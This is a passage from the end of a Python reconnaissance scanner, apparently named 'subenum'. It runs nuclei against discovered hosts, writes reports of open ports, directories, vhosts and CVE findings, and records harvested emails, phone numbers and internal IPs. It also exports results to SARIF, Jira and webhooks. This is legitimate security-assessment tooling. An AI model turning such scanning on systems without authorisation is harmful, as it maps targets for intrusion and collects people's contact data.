        res2 = await asyncio.gather(*tasks2, return_exceptions=True)
        for k, r in zip(keys2, res2):
            if isinstance(r, BaseException):
                note_check_error(k, f"failed: {r}")
            elif k == "sweep" and r:
                rows2, sw_names = r
                port_results = sorted(set(port_results) | set(rows2))
                if sw_names:
                    evidence |= sw_names
                    new_sw = sw_names - set(live)
                    if new_sw:
                        print(f"      verifying {len(new_sw)} sweep PTR names ...",
                              flush=True)
                        live.update(await resolve_all(new_sw, "sweep"))
    else:
        print("[16-18/19] skipped: no active checks enabled", flush=True)

    # ---------------- phase 19: nuclei ----------------
    if a.nuclei and live:
        print(f"[19/19] nuclei engine ({len(live)} hosts, "
              f"sev={a.nuclei_sev}) ...", flush=True)
        await nuclei_phase(live, probes, findings, a.nuclei_sev, a.nuclei_rate,
                           a.nuclei_timeout)
    else:
        print("[19/19] nuclei skipped (--no-nuclei or no live hosts)", flush=True)

    # ---------------- outputs ----------------
    stop_flush[0] = True
    flush_task.cancel()
    try:
        await flush_task
    except (asyncio.CancelledError, Exception):
        pass
    linkfile = base + "_links" + ext
    endfile = base + "_endpoints" + ext
    crawlfile = base + "_crawl" + ext
    portfile = base + "_ports" + ext
    dirfile = base + "_dirs" + ext
    vhostfile = base + "_vhosts" + ext
    surfacefile = base + "_surface" + ext
    jsonfile = base + ".json"
    repfile = base + "_report.html"
    old_run, bl_path = None, a.baseline or (jsonfile if a.delta else "")
    if bl_path and os.path.exists(bl_path):
        try:
            with open(bl_path, encoding="utf-8") as _bf:
                old_run = json.load(_bf)
            if not isinstance(old_run, dict):
                old_run = None
        except (OSError, ValueError):
            old_run = None
            print(f"[!] baseline unreadable: {bl_path}", flush=True)
    rows, links, js = [], [], []
    for h in sorted(live):
        i = probes.get(h, {})
        url = f"{i.get('scheme') or 'https'}://{h}/" if i.get("status") else ""
        flags = ",".join(i.get("tech", []))
        rows.append("\t".join([h, ",".join(live[h]), url, str(i.get("status", "")),
                               flags, i.get("title", ""), cname.get(h, ""),
                               str(i.get("redirects", ""))]))
        if i.get("status"):
            links.append(f"{url}   [{i['status']}] {i.get('title','')}".rstrip())
        js.append({"host": h, "ip": live[h], "cname": cname.get(h, ""),
                   "chain": chains.get(h, []),
                   "http": {k: v for k, v in i.items() if k not in ("body", "scripts")}})
    with open(base + ext, "w", encoding="utf-8") as f:
        f.write("# host\tip\turl\tstatus\ttech\ttitle\tcname\tredirects\n" + "\n".join(rows) + "\n")
    with open(linkfile, "w", encoding="utf-8") as f:
        f.write("\n".join(links) + "\n")
    if all_paths:
        with open(endfile, "w", encoding="utf-8") as f:
            f.write("\n".join(sorted(all_paths)) + "\n")
    if crawl_rows:
        with open(crawlfile, "w", encoding="utf-8") as f:
            f.write("# host\tpath\n" + "\n".join(crawl_rows) + "\n")
    if port_results:
        with open(portfile, "w", encoding="utf-8") as f:
            f.write("# host\tport\tbanner\n" +
                    "\n".join(f"{h}\t{p}\t{b}" for h, p, b in port_results) + "\n")
    with open(findfile, "w", encoding="utf-8") as f:
        f.write("\n".join(sorted(set(findings))) + "\n")
    if dir_rows:
        with open(dirfile, "w", encoding="utf-8") as f:
            f.write("# host\tstatus\tlen\tpath\n" + "\n".join(sorted(dir_rows)) + "\n")
    if vhost_rows:
        with open(vhostfile, "w", encoding="utf-8") as f:
            f.write("# ip\tvhost\tscheme\tstatus\tlen\n" +
                    "\n".join(sorted(vhost_rows)) + "\n")
    surface_rows = []
    for h in sorted(surf):
        s = surf[h]
        for e, w in sorted(s["emails"].items()):
            surface_rows.append(f"{h}\temail\t{e}\t{w}")
        for p, w in sorted(s["phones"].items()):
            surface_rows.append(f"{h}\tphone\t{p}\t{w}")
        for ip, w in sorted(s["ips"].items()):
            surface_rows.append(f"{h}\tinternal-ip\t{ip}\t{w}")
    for h, tags in sorted(cdn.items()):
        surface_rows.append(f"{h}\tcdn/waf\t{','.join(tags)}\t")
    if surface_rows:
        with open(surfacefile, "w", encoding="utf-8") as f:
            f.write("# host\ttype\tvalue\twhere\n" + "\n".join(surface_rows) + "\n")
    n_email = sum(len(s["emails"]) for s in surf.values())
    n_phone = sum(len(s["phones"]) for s in surf.values())
    n_ip = sum(len(s["ips"]) for s in surf.values())
    cve_list = [f for f in sorted(set(findings))
                if f.startswith(("[CVE-", "[JS-CVE]", "[EOL]"))]
    with open(jsonfile, "w", encoding="utf-8") as f:
        json.dump({"schema_version": 1,
                   "generated": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
                   "tool": {"name": "subenum", "version": "9"},
                   "argv": sys.argv,
                   "targets": domains, "elapsed": round(time.time() - t0, 1),
                   "count": len(live), "hosts": js, "apex_records": apex,
                   "findings": sorted(set(findings)),
                   # count UNIQUE findings (the "findings" array above is
                   # de-duplicated; raw counts inflated the severity tallies)
                   "severity": {s: sum(1 for f in set(findings) if sev(f) == s)
                                for s in ("critical", "high", "medium", "low", "info")},
                   "endpoints": len(all_paths),
                   "crawl_pairs": len(crawl_rows), "mined": mined_n,
                   "ports": [{"host": h, "port": p, "banner": b} for h, p, b in port_results],
                   "dangling": dangling, "certs": certs,
                   "dir_hits": len(dir_rows), "vhost_hits": len(vhost_rows),
                   "api_hits": len(api_rows), "method_hits": len(method_rows),
                   "cves": cve_list, "cdn": cdn,
                   "surface": {"emails": n_email, "phones": n_phone,
                               "internal_ips": n_ip, "sens_params": surfinfo["params"]}},
                  f, indent=2)
    if not a.noreport:
        write_report(repfile, domains, live, probes, cname, findings, port_results,
                     all_paths, crawl_rows, time.time() - t0)
    if a.sarif:
        write_sarif(base + ".sarif", findings, domains)
    if a.junit:
        write_junit(base + "_junit.xml", findings)
    if a.csv:
        with open(base + ".csv", "w", encoding="utf-8", newline="") as f:
            f.write(findings_csv(list(dict.fromkeys(str(x) for x in findings))))
    if a.dd_url:
        await dd_upload(a, domains, findings)
    if a.jira_url:
        await jira_upload(a, findings)
    if old_run is not None:
        d = diff_baseline(old_run, sorted(live), sorted(set(findings)))
        dffile = base + "_diff.txt"
        with open(dffile, "w", encoding="utf-8") as f:
            f.write(f"# baseline: {bl_path}\n"
                    f"# +{len(d['new_hosts'])} hosts  +{len(d['new_findings'])} findings  "
                    f"-{len(d['gone_hosts'])} hosts  "
                    f"-{len(d['gone_findings'])} findings no longer present\n")
            for h in d["new_hosts"]:
                f.write(f"+host\t{h}\n")
            for x in d["new_findings"]:
                f.write(f"+finding\t{x}\n")
            for h in d["gone_hosts"]:
                f.write(f"-host\t{h}\n")
            for x in d["gone_findings"]:
                f.write(f"-finding\t{x}\n")
        print(f"[+] baseline diff vs {bl_path}: "
              f"+{len(d['new_hosts'])} hosts, +{len(d['new_findings'])} findings, "
              f"-{len(d['gone_findings'])} no longer present -> {dffile}", flush=True)

    # ---------------- console report ----------------
    fs = sorted(set(findings))
    cnt = Counter(sev(f) for f in fs)
    sevline = "  ".join(f"{s}={cnt.get(s, 0)}" for s in
                        ("critical", "high", "medium", "low", "info") if cnt.get(s, 0))
    print(f"\n{'='*78}\n[+] {len(live)} live subdomains  |  {len(fs)} findings ({sevline})  |  "
          f"{len(all_paths)} endpoints  |  {len(crawl_rows)} crawl pairs  |  "
          f"{len(port_results)} open ports\n"
          f"[+] {len(dir_rows)} dir hits  |  {len(vhost_rows)} vhost hits  |  "
          f"{len(api_rows)} api/graphql hits  |  {len(method_rows)} method hits  |  "
          f"{len(cve_list)} CVE/EOL  |  {len(cdn)} edge-mapped  |  "
          f"{n_email} emails / {n_phone} phones / {n_ip} internal IPs  |  "
          f"{time.time()-t0:.1f}s\n{'='*78}")
    if CHECK_ERRORS:
        seen_tags = sorted({t for t, _ in CHECK_ERRORS})
        print(f"[!] {len(CHECK_ERRORS)} check error(s) in {len(seen_tags)} "
              f"check(s): {', '.join(seen_tags)}", flush=True)
        for t, m in CHECK_ERRORS[:10]:
            print(f"  [{t}] {m}", flush=True)
        if len(CHECK_ERRORS) > 10:
            print(f"  ... and {len(CHECK_ERRORS) - 10} more "
                  f"(see --web /api/stats errors count)", flush=True)
    for h in sorted(live):
        i = probes.get(h, {})
        tag = f"[{i.get('status','')}] " if i.get("status") else ""
        tech = " ".join(i.get("tech", []))
        print(f"  {h:<44}{tag:<6}{i.get('title','')[:40]:<42}{tech}")
    if port_results:
        print("\n--- OPEN PORTS (non-80/443) ---")
        for h, p, b in port_results:
            if p in (80, 443):
                continue
            print(f"  {h}:{p}  {b[:70]}")
    if fs:
        print("\n--- FINDINGS (by severity) ---")
        for s in ("critical", "high", "medium", "low", "info"):
            for x in fs:
                if sev(x) == s:
                    print(f"  [{s:<8}] {x}")
    print(f"\nfiles: {base+ext} | {linkfile} | {endfile} | {crawlfile} | {portfile} | "
          f"{findfile} | {dirfile if dir_rows else '-'} | "
          f"{vhostfile if vhost_rows else '-'} | "
          f"{surfacefile if surface_rows else '-'} | {jsonfile}"
          + ("" if a.noreport else f" | {repfile}")
          + (f" | {base}.sarif" if a.sarif else "")
          + (f" | {base}_junit.xml" if a.junit else "")
          + (f" | {base}_diff.txt" if old_run is not None else "")
          + (f" | {base}_graphql.txt"
             if a.api and os.path.exists(base + "_graphql.txt") else ""))
    hook = a.webhook or os.environ.get("SUBENUM_WEBHOOK", "")
    if hook:
        # delta rides along when a baseline was supplied so receivers can
        # alert on NEW findings/hosts only - lists capped, totals exact
        delta = ({"new_hosts": d["new_hosts"][:50],
                  "new_findings": d["new_findings"][:50],
                  "gone_hosts": d["gone_hosts"][:20],
                  "gone_findings": d["gone_findings"][:20],
                  "new_hosts_total": len(d["new_hosts"]),
                  "new_findings_total": len(d["new_findings"])}
                 if old_run is not None else None)
        await send_webhook(hook, {
            "tool": "subenum", "version": 10, "targets": domains,
            "hosts": len(live), "findings": len(fs),
            "severity": {s: cnt.get(s, 0) for s in
                         ("critical", "high", "medium", "low", "info")},
            "critical_high": [x for x in fs
                              if sev(x) in ("critical", "high")][:50],
            "delta": delta,
            "endpoints": len(all_paths), "open_ports": len(port_results),
            "elapsed": round(time.time() - t0, 1),
            "files": {"json": jsonfile,
                      "report": None if a.noreport else repfile}}, timeout=10)
    # a finished run must never leave a resumable checkpoint behind,
    # regardless of --no-report (otherwise the next run auto-resumes it)
    try:
        os.remove(statefile)
    except OSError:
        pass
    if a.fail_on:
        rank = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}
        th = rank[a.fail_on]
        if any(rank.get(sev(f), 0) >= th for f in fs):
            print(f"[!] --fail-on {a.fail_on}: threshold met -> exit code 2",
                  flush=True)
            sys.exit(2)


def load_words(paths, max_words):
    words = list(dict.fromkeys(DEFAULT_WORDS + EXTRA_WORDS))
    for p in paths:
        if os.path.exists(p):
            with open(p, encoding="utf-8", errors="ignore") as f:
                for line in f:
                    w = line.strip().lower()
                    if re.fullmatch(r"[a-z0-9][a-z0-9\-]{0,60}", w) and w not in words:
                        words.append(w)
        elif p:
            print(f"[!] wordlist not found: {p} - using defaults", flush=True)
    return words[:max_words]


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        sys.exit("\n[!] interrupted")
